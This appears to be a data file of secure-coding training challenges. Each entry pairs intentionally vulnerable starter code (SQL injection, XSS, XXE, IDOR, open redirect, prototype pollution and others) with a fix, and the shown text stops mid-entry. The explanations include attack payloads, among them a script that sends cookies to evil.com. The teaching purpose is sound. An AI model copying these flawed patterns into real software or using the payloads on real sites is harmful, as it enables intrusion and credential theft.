module.exports = [
  {
    "title": "SQL Injection in Login Form",
    "difficulty": "Easy",
    "description": "A login endpoint builds its SQL query by directly concatenating user-supplied username and password into a query string. An attacker can bypass authentication by entering `' OR '1'='1` as the username.",
    "programmingLanguage": "PHP",
    "challengeDetails": "SQL injection remains one of the most exploited vulnerabilities on the web. In this challenge, the login function concatenates raw user input directly into a SQL query string — meaning an attacker can supply SQL syntax that alters the query's logic entirely. Entering `' OR '1'='1` as the username terminates the string early and appends a condition that always evaluates to true, granting access without a valid password. More dangerous payloads can dump table contents, drop tables, or even write files to disk. Your task is to rewrite the function using PDO or MySQLi prepared statements with bound parameters, so user input is treated as data rather than executable SQL. Also note: passwords should never be stored or compared in plain text — add `password_hash()` on registration and `password_verify()` on login.",
    "initialCode": "<?php\n// VULNERABLE: Direct string concatenation\nfunction loginUser($username, $password) {\n    $conn = new mysqli(\"localhost\",\"root\",\"\",\"app\");\n    $query = \"SELECT * FROM users WHERE username='\"\n           . $username . \"' AND password='\" . $password . \"'\";\n    $result = $conn->query($query);\n    if ($result->num_rows > 0) {\n        return true; // logged in!\n    }\n    return false;\n}\nloginUser($_POST['username'], $_POST['password']);\n?>",
    "recommendation": "Use PDO or MySQLi prepared statements. Bind parameters so user input is never interpreted as SQL syntax. Also hash passwords with `password_hash()` — never compare plain text."
  },
  {
    "title": "Reflected XSS via Search Input",
    "difficulty": "Easy",
    "description": "A search results page reflects the query parameter directly into the page DOM using `innerHTML`, allowing an attacker to craft a URL containing a script payload.",
    "programmingLanguage": "JavaScript",
    "challengeDetails": "Reflected XSS occurs when user-supplied data is taken from the request (here, a URL query parameter) and immediately written back into the page without sanitization. Because the code uses `innerHTML`, the browser parses the value as HTML — so a search term like `<img src=x onerror=alert(1)>` executes JavaScript in the victim's browser. Unlike stored XSS the payload isn't saved; the attacker tricks a user into clicking a crafted link. This is particularly dangerous for stealing session cookies, redirecting users to phishing pages, or silently performing actions on behalf of the victim. Your task is to fix the rendering so that the search query is treated as plain text. Prefer `textContent` for user-supplied strings, or escape HTML entities before any `innerHTML` assignment. For rich content from trusted sources, evaluate a library like DOMPurify.",
    "initialCode": "// VULNERABLE: innerHTML with unsanitized user input\nconst params = new URLSearchParams(window.location.search);\nconst query = params.get('q');\ndocument.getElementById('results-heading').innerHTML =\n    'Search results for: ' + query; // XSS here",
    "recommendation": "Use `textContent` instead of `innerHTML` for plain text, or escape HTML entities before insertion. For rich content, use DOMPurify. Never trust URL parameters."
  },
  {
    "title": "Hardcoded Database Credentials",
    "difficulty": "Easy",
    "description": "Database credentials are hardcoded directly in the source file. When pushed to a shared Git host, anyone with access can read the production password.",
    "programmingLanguage": "Python",
    "challengeDetails": "Hardcoded secrets are one of the most common causes of credential leaks. Once source code is committed to a version control system — even a private repository — the credentials are permanently baked into git history. Tools like `git log` and `git blame` can recover them even after the file is edited. Attackers routinely scan GitHub for patterns like `password=` or `psycopg2.connect`. Beyond git, hardcoded credentials appear in build artifacts, Docker images, and log files. Your task is to remove the literal password and load it at runtime from the environment instead. Use `os.environ.get('DB_PASSWORD')` or a library like `python-dotenv` to read from a local `.env` file (which must be listed in `.gitignore`). In production, credentials should come from a secrets manager such as AWS Secrets Manager or HashiCorp Vault.",
    "initialCode": "# VULNERABLE: Hardcoded credentials\nimport psycopg2\n\ndef get_connection():\n    return psycopg2.connect(\n        host=\"prod-db.internal\",\n        database=\"customers\",\n        user=\"admin\",\n        password=\"Sup3rS3cr3tP@ss!\"  # <-- hardcoded!\n    )",
    "recommendation": "Load secrets from environment variables (`os.environ`) or a secrets manager (AWS Secrets Manager, HashiCorp Vault). Use a `.env` file locally with `python-dotenv` and ensure `.env` is in `.gitignore`."
  },
  {
    "title": "Insecure Direct Object Reference (IDOR)",
    "difficulty": "Easy",
    "description": "An API endpoint returns a user profile using a numeric ID from the URL without verifying the requesting user owns that ID.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "IDOR vulnerabilities arise when an application trusts user-supplied identifiers to access resources without verifying ownership. Here, the endpoint fetches any user record by its numeric database ID taken directly from the URL — meaning any authenticated user can read any other user's profile by incrementing or guessing the ID. Sequential integers (1, 2, 3…) make enumeration trivial. The fix is not to hide IDs but to enforce authorization: after fetching the record, compare the resource's owner against the authenticated requester (`req.user.id`). If they don't match and the requester isn't an admin, return HTTP 403. As a secondary defense, consider using UUIDs instead of sequential integers to make IDs harder to guess — but never rely on obscurity alone as your authorization strategy.",
    "initialCode": "// VULNERABLE: No ownership check\napp.get('/api/users/:id', async (req, res) => {\n    const user = await db.users.findById(req.params.id);\n    if (!user) return res.status(404).json({ error: 'Not found' });\n    res.json(user); // returns anyone's profile!\n});",
    "recommendation": "After retrieving the resource, verify `req.user.id === user.id` (or that the requester has an admin role). Return 403 Forbidden on mismatch."
  },
  {
    "title": "Missing HTTPS / Sensitive Data Over HTTP",
    "difficulty": "Easy",
    "description": "A Flask application transmits user login credentials and session tokens over plain HTTP.",
    "programmingLanguage": "Python",
    "challengeDetails": "Running a login endpoint over plain HTTP exposes every credential and session token to anyone on the same network — a coffee shop Wi-Fi, a corporate proxy, or a malicious ISP. An attacker performing a passive network capture can read usernames, passwords, and session cookies as they travel in plaintext. This code compounds the risk in two additional ways: `debug=True` in production exposes an interactive Werkzeug debugger that allows arbitrary Python execution, and the secret key `'abc123'` is too short to provide meaningful HMAC security for session cookies. Your task is to ensure the app is deployed behind TLS (via nginx, Caddy, or a cloud load balancer), enforce HTTPS-only cookies with `SESSION_COOKIE_SECURE=True`, redirect all HTTP traffic to HTTPS, and disable debug mode with an environment variable guard.",
    "initialCode": "# VULNERABLE: Running on HTTP with debug=True in production\nfrom flask import Flask, request, session\napp = Flask(__name__)\napp.secret_key = 'abc123'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    session['user'] = username\n    return 'OK'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80, debug=True)  # plain HTTP!",
    "recommendation": "Deploy behind a TLS-terminating reverse proxy (nginx/Caddy) or use Flask-Talisman. Set `SESSION_COOKIE_SECURE=True`. Redirect all HTTP traffic to HTTPS. Disable debug mode in production."
  },
  {
    "title": "Open Redirect",
    "difficulty": "Easy",
    "description": "A post-login redirect uses a user-controlled `next` parameter without validation.",
    "programmingLanguage": "Java",
    "challengeDetails": "Open redirects are commonly dismissed as low-severity, but they are a powerful phishing enabler. Because the redirect originates from a legitimate domain, users and email filters trust the link. An attacker crafts a URL like `https://yourbank.com/login?next=https://evil.com/fake-login` — after the victim authenticates, they land on the attacker's site, which mimics the real one. Open redirects are also used in OAuth flows to steal authorization codes by substituting the callback URL. In this challenge the `next` parameter is passed directly to `sendRedirect()` with no validation. Your fix should reject any value that is an absolute URL (detected with `URI.create(next).isAbsolute()`), and only allow paths that start with `/` and appear in a server-side allowlist of known safe destinations.",
    "initialCode": "// VULNERABLE: Unvalidated redirect\n@GetMapping(\"/login\")\npublic String login(@RequestParam String next,\n                    HttpServletResponse response) throws IOException {\n    // ... authenticate user ...\n    response.sendRedirect(next); // attacker-controlled destination!\n    return null;\n}",
    "recommendation": "Maintain an allowlist of permitted redirect paths. Reject any `next` value that is absolute (starts with `http`/`https`) or does not begin with `/`. Use `URI.create(next).isAbsolute()` to detect absolute URLs."
  },
  {
    "title": "Weak Password Hashing with MD5",
    "difficulty": "Easy",
    "description": "User passwords are stored as MD5 hashes. MD5 is fast, unsalted, and its hashes appear in precomputed rainbow tables.",
    "programmingLanguage": "PHP",
    "challengeDetails": "MD5 was designed for speed — a quality that is catastrophic for password storage. A modern GPU can compute billions of MD5 hashes per second, allowing an attacker who steals the database to crack common passwords in seconds using precomputed rainbow tables or brute force. The absence of a per-password salt means identical passwords produce identical hashes, leaking which users share the same password. SHA-1 and plain SHA-256 have the same problems. Password hashing requires a purpose-built, deliberately slow algorithm: bcrypt, scrypt, or Argon2. These algorithms apply a configurable work factor that can be increased as hardware improves. Your task is to replace `md5()` with `password_hash($password, PASSWORD_BCRYPT, ['cost' => 12])` on registration and `password_verify($input, $stored)` on login.",
    "initialCode": "<?php\n// VULNERABLE: MD5 password hashing\nfunction registerUser($username, $password) {\n    $hashed = md5($password); // fast, unsalted, broken\n    $stmt = $pdo->prepare(\n        \"INSERT INTO users (username, password) VALUES (?, ?)\");\n    $stmt->execute([$username, $hashed]);\n}\n\nfunction verifyUser($username, $password) {\n    return $stored_hash === md5($password);\n}\n?>",
    "recommendation": "Use `password_hash($password, PASSWORD_BCRYPT)` with a cost factor of at least 12, or `PASSWORD_ARGON2ID`. Verify with `password_verify()`."
  },
  {
    "title": "Verbose Error Messages Leaking Stack Traces",
    "difficulty": "Easy",
    "description": "Unhandled exceptions are returned directly to the client including full stack traces and internal file paths.",
    "programmingLanguage": "Python",
    "challengeDetails": "Stack traces are invaluable for developers but a goldmine for attackers. They expose internal file paths (revealing directory structure and framework versions), class and function names (useful for crafting targeted exploits), database table names and query fragments (useful for SQL injection), and third-party library versions (enabling known-CVE attacks). This error handler returns the full traceback to every client, treating anonymous users to the same diagnostic detail as a local developer. Your task is to replace the verbose response with a generic error message like `'An unexpected error occurred'`, and redirect the full traceback to a server-side logging system using Python's `logging` module or a service like Sentry. In production, structured logging with severity levels, timestamps, and request IDs is far more useful than plaintext tracebacks sent to the browser.",
    "initialCode": "# VULNERABLE: Unhandled exceptions bubble to user\nfrom flask import Flask, jsonify\nimport traceback\n\napp = Flask(__name__)\n\n@app.errorhandler(Exception)\ndef handle_error(e):\n    return jsonify({\n        \"error\": str(e),\n        \"traceback\": traceback.format_exc()  # Returns full traceback to client!\n    }), 500",
    "recommendation": "Return only a generic message (`'An unexpected error occurred'`) to the client. Log detailed error information server-side using Python's `logging` module."
  },
  {
    "title": "Insecure Cookie Flags",
    "difficulty": "Easy",
    "description": "A session cookie is issued without HttpOnly, Secure, or SameSite attributes, leaving it exposed to JavaScript access, transmission over HTTP, and cross-site request forgery.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "Session cookies are a high-value target — stealing one gives an attacker full account access without needing the password. Three cookie attributes directly mitigate the main theft vectors, and all three are missing here. `HttpOnly` prevents JavaScript from reading the cookie via `document.cookie`, which blocks XSS-based cookie theft. `Secure` ensures the browser only sends the cookie over HTTPS connections, preventing interception on unencrypted networks. `SameSite: Strict` (or `Lax`) controls when the browser attaches the cookie to cross-origin requests, providing a strong defense against CSRF attacks. Without these, even a minor XSS vulnerability elsewhere on the page can lead to full session hijacking. Your task is to add all three attributes to the cookie options and confirm the session token itself is generated with a cryptographically secure source.",
    "initialCode": "// VULNERABLE: Insecure cookie settings\napp.post('/login', (req, res) => {\n    const token = generateSessionToken();\n    res.cookie('session', token, {\n        maxAge: 86400000  // no httpOnly, no secure, no sameSite!\n    });\n    res.json({ success: true });\n});",
    "recommendation": "Set `httpOnly: true`, `secure: true`, and `sameSite: 'Strict'`. Example: `res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'Strict', maxAge: 86400000 })`."
  },
  {
    "title": "Directory Listing Enabled",
    "difficulty": "Easy",
    "description": "An Express static file server is configured to serve the entire project directory with directory listing enabled.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "Enabling directory listing on the application's root exposes everything — `node_modules`, `.env` files, configuration JSON, private keys, source maps, and internal scripts — to any visitor who navigates to `/` in a browser. Even if individual files aren't directly executable, their contents reveal the application's full structure, dependency versions (useful for CVE matching), API keys, and database URLs. The `serve-index` middleware is intended for development convenience and has no place in production. Your task is to restrict static file serving to a dedicated `public/` subdirectory, remove the `serveIndex` middleware entirely, and ensure all secrets and config files are stored outside the web root. Also verify that your `.env` file, `package.json`, and any private keys cannot be accessed via HTTP.",
    "initialCode": "// VULNERABLE: Serving root directory with listing\nconst express = require('express');\nconst serveIndex = require('serve-index');\nconst app = express();\n\napp.use('/', express.static('.'));\napp.use('/', serveIndex('.', { icons: true }));\napp.listen(3000);",
    "recommendation": "Serve only a dedicated `public` subdirectory. Never enable `serveIndex` in production. Ensure `.env` and config files are outside the web root."
  },
  {
    "title": "Mass Assignment Vulnerability",
    "difficulty": "Easy",
    "description": "A profile update endpoint passes the entire request body directly to a database update call. An attacker can include privileged fields like `role` or `isAdmin`.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "Mass assignment vulnerabilities occur when an application blindly binds all request body fields to a data model without specifying which fields are permitted. Here, `req.body` is passed directly to a MongoDB `$set` — meaning a user who sends `{ \"name\": \"Alice\", \"role\": \"admin\", \"isAdmin\": true }` will have those fields written to the database. The attacker doesn't need any special access; they just need to know (or guess) what privileged field names look like. This class of bug famously enabled a mass GitHub account compromise in 2012. Your fix is to explicitly destructure only the fields you intend to allow updates on: `const { name, email, bio } = req.body`. Use a validation library like Joi or Zod to enforce allowed fields and their types, rejecting any unrecognized keys.",
    "initialCode": "// VULNERABLE: Mass assignment — req.body passed directly\napp.put('/api/profile', authenticate, async (req, res) => {\n    const updated = await db.users.update(\n        { id: req.user.id },\n        { $set: req.body }  // attacker can set any field!\n    );\n    res.json(updated);\n});",
    "recommendation": "Explicitly whitelist allowed fields: `const { name, email, bio } = req.body;`. Use a validation library like Joi or Zod."
  },
  {
    "title": "Unvalidated File Extension Upload",
    "difficulty": "Easy",
    "description": "A file upload endpoint checks only the client-provided filename extension. An attacker can rename a PHP web shell to bypass the check.",
    "programmingLanguage": "PHP",
    "challengeDetails": "File upload features are among the most dangerous in web applications because a successful exploit can lead directly to remote code execution. This check reads the extension from the client-supplied filename — a value the attacker controls entirely. Renaming `shell.php` to `shell.jpg` trivially bypasses it. Even if the server stores the file with its original name in a web-accessible directory, a single HTTP request to that path executes the uploaded code with the web server's privileges. Your fix requires multiple layers: validate the actual file type using `finfo_file()` which reads the file's magic bytes, not its name; rename uploaded files to random UUIDs with no extension before storage; store uploads in a directory outside the web root so they cannot be directly requested; and serve downloads through a controller that reads the file contents and streams them with an explicit `Content-Type` header.",
    "initialCode": "<?php\n// VULNERABLE: Client-supplied extension check only\nfunction uploadFile($file) {\n    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));\n    $allowed = ['jpg', 'jpeg', 'png', 'gif'];\n    if (in_array($ext, $allowed)) {\n        move_uploaded_file($file['tmp_name'],\n            'uploads/' . $file['name']); // dangerous!\n        return true;\n    }\n    return false;\n}\n?>",
    "recommendation": "Validate using `finfo_file()` to check the actual MIME type. Store uploads outside the web root. Rename files to random UUIDs. Never serve uploaded files with execution permissions."
  },
  {
    "title": "Sensitive Data in URL Query String",
    "difficulty": "Easy",
    "description": "A password reset token is embedded in a URL query string and logged server-side, exposing it through browser history, server logs, and referrer headers.",
    "programmingLanguage": "JavaScript",
    "challengeDetails": "Placing security tokens in URL query strings seems harmless, but the URL is one of the most broadly logged pieces of data in any web system. It appears in browser history (accessible to other users on shared computers), server access logs, reverse proxy logs, CDN logs, and analytics platforms. Crucially, the `Referer` header sent when a user clicks a link from a password reset email includes the full URL — meaning the token is silently forwarded to any third-party embedded on the destination page. This code also logs the token server-side, creating another exposure path. Your task is to embed the token in the URL path (`/reset/:token`) rather than a query parameter, store only a securely hashed version in the database (so the raw token never persists), set a short expiry of 15 minutes, and never log the raw token value.",
    "initialCode": "// VULNERABLE: Token in URL\nfunction sendPasswordReset(email, token) {\n    const resetLink =\n        `https://app.com/reset?email=${email}&token=${token}`;\n    sendEmail(email, 'Reset your password', resetLink);\n}\n\napp.get('/reset', (req, res) => {\n    const { token } = req.query;\n    console.log('Reset attempt with token:', token); // logged!\n});",
    "recommendation": "Embed the token in the URL path (`/reset/TOKEN`), use POST for submission, store a hashed version server-side, set a short expiry (15 minutes), and never log the token value."
  },
  {
    "title": "Default Admin Credentials Not Changed",
    "difficulty": "Easy",
    "description": "An admin panel is shipped with hardcoded default credentials (`admin`/`admin`).",
    "programmingLanguage": "Python",
    "challengeDetails": "Default credentials are a well-known attack vector — bots and exploit frameworks routinely try `admin/admin`, `admin/password`, and similar combinations against every admin URL they find. Shipping hardcoded credentials in source code makes the situation worse: the password is not just guessable but literally readable by anyone with repository access. This code compares credentials as plain strings with no hashing and no rate limiting, meaning brute-force attempts face no resistance. Your task involves several changes: remove all hardcoded credentials from source code; migrate admin accounts to a database with bcrypt-hashed passwords; enforce a password change on first login by checking a `must_change_password` flag; implement account lockout after N failed attempts to prevent brute force; and consider requiring multi-factor authentication for all admin access.",
    "initialCode": "# VULNERABLE: Hardcoded default credentials\nADMIN_CREDENTIALS = {\n    \"username\": \"admin\",\n    \"password\": \"admin\"  # default, never changed\n}\n\n@app.route('/admin/login', methods=['POST'])\ndef admin_login():\n    data = request.json\n    if (data['username'] == ADMIN_CREDENTIALS['username'] and\n            data['password'] == ADMIN_CREDENTIALS['password']):\n        session['admin'] = True\n        return jsonify({'success': True})\n    return jsonify({'error': 'Invalid credentials'}), 401",
    "recommendation": "Remove all hardcoded default credentials. Force password change on first login. Store credentials in the database using bcrypt. Implement account lockout after failed attempts. Prefer SSO or MFA for admin interfaces."
  },
  {
    "title": "Insecure Math.random() for Tokens",
    "difficulty": "Easy",
    "description": "Security-sensitive tokens are generated using `Math.random()`, which is not cryptographically secure and can be predicted by an attacker.",
    "programmingLanguage": "JavaScript",
    "challengeDetails": "`Math.random()` is a pseudorandom number generator seeded with a value that, in some JavaScript engines, can be partially inferred from observable outputs. More fundamentally, it was never designed for security — it produces numbers with only about 52 bits of entropy and its internal state can sometimes be recovered after observing a sequence of outputs. Password reset tokens and CSRF tokens generated with `Math.random()` may be forgeable by a sufficiently motivated attacker. The Web Crypto API provides a cryptographically secure alternative that is available in all modern browsers and Node.js. Your task is to replace every call to `Math.random()` in security contexts with `crypto.randomBytes(32)` in Node.js or `crypto.getRandomValues()` in the browser, producing tokens with 256 bits of entropy that cannot be predicted or reproduced.",
    "initialCode": "// VULNERABLE: Math.random() for security tokens\nfunction generateResetToken() {\n    return Math.random().toString(36).substring(2) +\n           Math.random().toString(36).substring(2);\n}\n\nfunction generateCSRFToken() {\n    return Math.random().toString(36).substr(2, 16);\n}",
    "recommendation": "Use the Web Crypto API: `crypto.randomUUID()` or `crypto.getRandomValues(new Uint8Array(32))` in the browser. In Node.js use `crypto.randomBytes(32).toString('hex')`."
  },
  {
    "title": "Unescaped Output in Template",
    "difficulty": "Easy",
    "description": "A Jinja2 template uses the `|safe` filter on user-controlled data, disabling auto-escaping and enabling stored XSS.",
    "programmingLanguage": "Python",
    "challengeDetails": "Jinja2 auto-escapes HTML characters by default, converting `<`, `>`, and `\"` to their safe entity equivalents. The `|safe` filter tells Jinja2 to trust the value and render it as raw HTML — which is appropriate for content you fully control (like a hardcoded snippet), but catastrophic for user-supplied content. A user who sets their bio to `<script>document.location='https://evil.com/?c='+document.cookie</script>` will have that script execute in every visitor's browser, stealing session cookies. This is stored XSS: the payload is saved to the database and served repeatedly. Your task is to remove `|safe` from any template location that renders user-supplied data and rely on Jinja2's default escaping. If users need limited rich text (bold, links), sanitize their input server-side with `bleach` using a strict allowlist before storage.",
    "initialCode": "# VULNERABLE: |safe disables auto-escaping\n# template.html:\n# <div class=\"bio\">{{ user.bio | safe }}</div>\n\n@app.route('/profile/<int:uid>')\ndef profile(uid):\n    user = db.get_user(uid)\n    return render_template('template.html', user=user)",
    "recommendation": "Never use `|safe` on user-controlled data. Rely on Jinja2's default auto-escaping. If rich HTML is required, use a whitelist-based sanitizer like `bleach` before storage."
  },
  {
    "title": "Logging Sensitive User Data",
    "difficulty": "Easy",
    "description": "A payment service logs the full request object including credit card numbers and CVVs.",
    "programmingLanguage": "Java",
    "challengeDetails": "Logging is essential for debugging and auditing, but log files are among the most broadly accessible artifacts in a system — written to disk, shipped to log aggregation platforms, indexed by SIEM tools, and often retained for months or years. A `PaymentRequest` whose `toString()` includes `cardNumber` and `cvv` fields will write PAN data to every log sink the application uses, creating a PCI-DSS violation and a significant breach risk. Attackers who compromise a logging system — or simply an employee with log access — gain access to raw card data. Your task is to override `toString()` in `PaymentRequest` to return a redacted representation (e.g., masking all but the last four digits), audit all logger calls that accept object arguments, and ensure no password, token, SSN, or card data ever appears in a log statement in any environment.",
    "initialCode": "// VULNERABLE: Logging full payment request\n@PostMapping(\"/payment\")\npublic ResponseEntity<?> processPayment(\n        @RequestBody PaymentRequest req) {\n    logger.info(\"Processing payment: {}\", req);\n    // PaymentRequest.toString() includes cardNumber and cvv!\n    paymentService.charge(req);\n    return ResponseEntity.ok(\"Charged\");\n}",
    "recommendation": "Override `toString()` in sensitive model classes to return a redacted representation. Use structured logging with field-level masking. Never log card numbers, passwords, SSNs, or authentication tokens."
  },
  {
    "title": "XML External Entity (XXE) — Basic",
    "difficulty": "Easy",
    "description": "An XML parsing endpoint uses lxml's default parser configuration, which allows external entity processing and can be used to read local files or initiate SSRF.",
    "programmingLanguage": "Python",
    "challengeDetails": "XML supports a feature called external entities that allows the document to reference and include content from external URIs or local file paths. When a parser processes an entity like `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`, it reads and inlines the referenced file. An attacker who can submit XML to this endpoint can exfiltrate `/etc/passwd`, private keys, `.env` files, or cloud metadata by embedding the file contents in an error message or response field. XXE can also be used for SSRF, making internal HTTP requests on behalf of the server. The fix is straightforward: disable external entity loading in the parser configuration. In lxml, use `etree.XMLParser(resolve_entities=False)`. For libraries that don't expose this option directly, switch to a safer XML library like `defusedxml`.",
    "initialCode": "# VULNERABLE: lxml with external entities enabled (default)\nfrom lxml import etree\n\n@app.route('/parse', methods=['POST'])\ndef parse_xml():\n    xml_data = request.data\n    root = etree.fromstring(xml_data)  # Default parser allows external entities!\n    return etree.tostring(root).decode()",
    "recommendation": "Use a safe parser configuration: `parser = etree.XMLParser(resolve_entities=False, no_network=True)` and pass it to `etree.fromstring(xml_data, parser)`. Alternatively, use the `defusedxml` library which disables all dangerous features by default."
  },
  {
    "title": "CORS Misconfiguration — Wildcard Origin",
    "difficulty": "Easy",
    "description": "An API uses a wildcard CORS policy combined with credentials, allowing any website to read authenticated API responses.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "CORS (Cross-Origin Resource Sharing) controls which origins can read responses from your API via browser requests. The `Access-Control-Allow-Origin: *` header means any website can read the response. Combining it with `Access-Control-Allow-Credentials: true` is actually rejected by browsers per the spec — but many misconfigured servers reflect the request's `Origin` header back instead of using a literal `*`, which achieves the same effect and is exploitable. An attacker can host a page at `evil.com` that uses JavaScript to call your authenticated API and read the response — exfiltrating user data, account details, or tokens. Your task is to maintain a strict allowlist of permitted origins, dynamically check if the request `Origin` matches the list, and only reflect allowed origins. Never combine wildcard with credentials.",
    "initialCode": "// VULNERABLE: Wildcard CORS on authenticated endpoint\napp.use((req, res, next) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Credentials', 'true');\n    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');\n    next();\n});",
    "recommendation": "Maintain a strict allowlist of permitted origins. Reflect only allowed origins dynamically. Never combine wildcard origin with credentials."
  },
  {
    "title": "Missing Authorization on Admin Endpoint",
    "difficulty": "Easy",
    "description": "An admin delete endpoint uses `@login_required` to verify a session exists but never checks whether the user has an admin role.",
    "programmingLanguage": "Python",
    "challengeDetails": "Authentication (verifying who you are) and authorization (verifying what you're allowed to do) are separate concerns, and conflating them is a common mistake. `@login_required` only confirms a session exists — any logged-in user, including a freshly registered account with no privileges, passes this check. An attacker who creates an account can then call `/admin/delete-user/1` and delete any user in the system. This is a broken access control vulnerability, one of the most critical categories in the OWASP Top 10. Your fix is to add a role check: `if current_user.role != 'admin': abort(403)`. Better yet, create a reusable `@admin_required` decorator that combines the session check and the role check, then apply it consistently to every administrative route. Audit all sensitive endpoints to ensure both checks are present.",
    "initialCode": "# VULNERABLE: Auth check but no role check\n@app.route('/admin/delete-user/<int:user_id>', methods=['DELETE'])\n@login_required  # checks session exists\ndef delete_user(user_id):\n    # Missing: check current_user.role == 'admin'\n    db.delete_user(user_id)\n    return jsonify({'deleted': user_id})",
    "recommendation": "Add role-based access control: `if current_user.role != 'admin': abort(403)`. Create a reusable `@admin_required` decorator that combines login and role checks."
  },
  {
    "title": "Insecure Redirect After Login with User Input",
    "difficulty": "Easy",
    "description": "A Next.js login page reads a `returnTo` query parameter and redirects to it after authentication without any validation.",
    "programmingLanguage": "TypeScript",
    "challengeDetails": "This is the same class of open redirect vulnerability as the Java challenge, but in a client-side React context where the redirect happens via `router.push()`. The danger is identical: an attacker shares a URL like `/login?returnTo=https://evil.com` and after the user authenticates on your legitimate domain, they are silently redirected to the attacker's site. In single-page applications, the risk is compounded because `router.push()` accepts both relative paths and full URLs, making the redirect more permissive than developers realize. Your task is to validate `returnTo` before using it: reject values that start with `http`, `//`, or any non-relative prefix, and ideally match against a server-side allowlist of known safe paths. Never trust URL parameters for navigation without validation.",
    "initialCode": "// VULNERABLE: Unvalidated redirect in Next.js\nimport { useRouter } from 'next/router';\n\nexport default function LoginPage() {\n    const router = useRouter();\n    const returnTo = router.query.returnTo as string;\n\n    async function handleLogin(credentials: Credentials) {\n        await authService.login(credentials);\n        router.push(returnTo || '/dashboard');  // unvalidated!\n    }\n}",
    "recommendation": "Validate that `returnTo` is a relative path: `const safe = returnTo?.startsWith('/') && !returnTo.startsWith('//') ? returnTo : '/dashboard'; router.push(safe);`."
  },
  {
    "title": "Prototype Pollution via Object Merge",
    "difficulty": "Easy",
    "description": "A utility function recursively merges a user-supplied JSON object without checking for the `__proto__` key.",
    "programmingLanguage": "JavaScript",
    "challengeDetails": "JavaScript objects inherit properties from `Object.prototype`. When a recursive merge function processes a key like `__proto__`, it doesn't create a new property on the target object — it modifies the prototype shared by all objects in the runtime. An attacker who sends `{ \"__proto__\": { \"isAdmin\": true } }` can pollute the prototype so that every subsequent `obj.isAdmin` check in the application returns `true`, even on freshly created objects. This can bypass authorization checks, inject unexpected properties into configuration objects, or cause denial of service. Prototype pollution vulnerabilities have been found in popular libraries like lodash and jQuery. Your fix is to check for dangerous keys during the merge — skip or throw on `__proto__`, `constructor`, and `prototype` — or use `Object.create(null)` for target objects and prefer structured-clone or `JSON.parse(JSON.stringify(src))` for safe deep copies.",
    "initialCode": "// VULNERABLE: Recursive merge without __proto__ guard\nfunction merge(target, source) {\n    for (const key in source) {\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            merge(target[key], source[key]);  // __proto__ poisoning!\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}",
    "recommendation": "Check for dangerous keys: `if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;` inside the loop. Or use `Object.assign({}, source)` for shallow copies and `structuredClone()` for deep copies."
  },
  {
    "title": "Unprotected Sensitive API Endpoint",
    "difficulty": "Easy",
    "description": "A metrics endpoint is registered before the authentication middleware, making it publicly accessible despite the developer's intent.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "Express middleware and route handlers execute in the order they are registered. Placing `app.get('/api/metrics', ...)` before `app.use('/api', authenticate)` means the metrics route is matched and served before the authentication check runs. The `/api/metrics` endpoint in this example exposes memory usage, database query counts, and error summaries — useful for profiling the application's behavior, identifying caching patterns, and understanding its load. This is an order-of-operations bug that can be easy to miss during code review. Your fix is to move the authentication middleware registration above all route definitions it is meant to protect. As a defensive practice, apply authentication as a named middleware argument directly on each route (`app.get('/api/metrics', authenticate, handler)`) so protection is explicit and cannot be accidentally bypassed by reordering.",
    "initialCode": "// VULNERABLE: Metrics route outside auth middleware\nconst app = express();\nconst authenticate = require('./middleware/auth');\n\napp.get('/api/metrics', (req, res) => {  // no auth!\n    res.json({\n        memory: process.memoryUsage(),\n        dbQueries: db.getQueryCount(),\n        errors: errorTracker.getSummary()\n    });\n});\n\napp.use('/api', authenticate);  // too late!\napp.get('/api/users', getUsers);",
    "recommendation": "Apply authentication middleware before route definitions: `app.use('/api', authenticate)` must come before any `app.get('/api/...')` calls."
  },
  {
    "title": "Information Disclosure via HTTP Headers",
    "difficulty": "Easy",
    "description": "An Express app broadcasts its technology stack via the default `X-Powered-By: Express` header and sets no security headers.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "The `X-Powered-By: Express` header is a small but meaningful gift to attackers: it confirms the server framework and version, allowing them to immediately target known Express CVEs, framework-specific middleware vulnerabilities, and route behavior. Fingerprinting is the first step in targeted attacks, and default headers accelerate it. Beyond removing this header, production Express apps should proactively set a suite of defensive headers: `Strict-Transport-Security` to enforce HTTPS, `X-Content-Type-Options: nosniff` to prevent MIME-type sniffing attacks, `X-Frame-Options: DENY` to block clickjacking, and a `Content-Security-Policy` to restrict what resources the browser loads. The `helmet` npm package sets all of these in a single middleware call. Your task is to disable `X-Powered-By` and add helmet to the middleware stack.",
    "initialCode": "// VULNERABLE: Default headers expose technology\nconst express = require('express');\nconst app = express();\n\n// X-Powered-By: Express is sent automatically\n// No security headers configured at all\napp.get('/', (req, res) => {\n    res.send('Hello World');\n});",
    "recommendation": "Use `app.disable('x-powered-by')` and the `helmet` package: `app.use(helmet())`. Helmet sets `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`, and removes `X-Powered-By`."
  },
  {
    "title": "Storing Plain Text Passwords",
    "difficulty": "Easy",
    "description": "A .NET application stores user passwords as plain strings in the database.",
    "programmingLanguage": "C#",
